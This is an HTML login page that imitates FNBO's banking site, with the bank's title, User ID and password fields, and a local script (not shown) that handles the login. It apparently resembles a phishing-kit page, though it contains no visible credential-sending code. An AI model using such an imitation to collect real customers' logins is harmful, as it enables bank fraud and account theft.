<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <link rel="stylesheet" href="./css/main.css">
    <link rel="icon" type="image/png" sizes="32x32" href="./icon.ico">
    <script src="https://kit.fontawesome.com/bcfb457481.js" crossorigin="anonymous"></script>
    <title>FNBO | Personal & Business Banking and Insights | FNBO</title>
</head>
<body>
    <div id="container">
        <div id="logo">
            <img src="./logo.svg">
        </div>
        <div id="content">
            <input type="text" name="userid" id="userid" placeholder="User ID" required>
            <input type="password" name="password" id="password" placeholder="Password" required>
            <div id="query">
                <p>Remember User ID</p>
                <label class="switch">
                    <input class="switch-input" type="checkbox" />
                    <span class="switch-label" data-on="" data-off=""></span> 
                    <span class="switch-handle"></span> 
                </label>
            </div>
            <button>Log In</button>
            <div class="link">
                <p>Forget User ID / Password</p>
            </div>
        </div>
        <div id="flex-box">
            <div id="box">
                <i class="fa-solid fa-phone"></i>
                <p>Contact Us</p>
            </div>
            <div id="box">
                <i class="fa-solid fa-location-dot"></i>
                <p>ATMs & Branches</p>
            </div>
            <div id="box">
                <i class="fa-solid fa-lock"></i>
                <p>Login Options</p>
            </div>
        </div>
        <div class="link">
            <p>Privacy & Security</p>
        </div>
    </div>
    <script src="./js/main.js"></script>
</body>
</html>
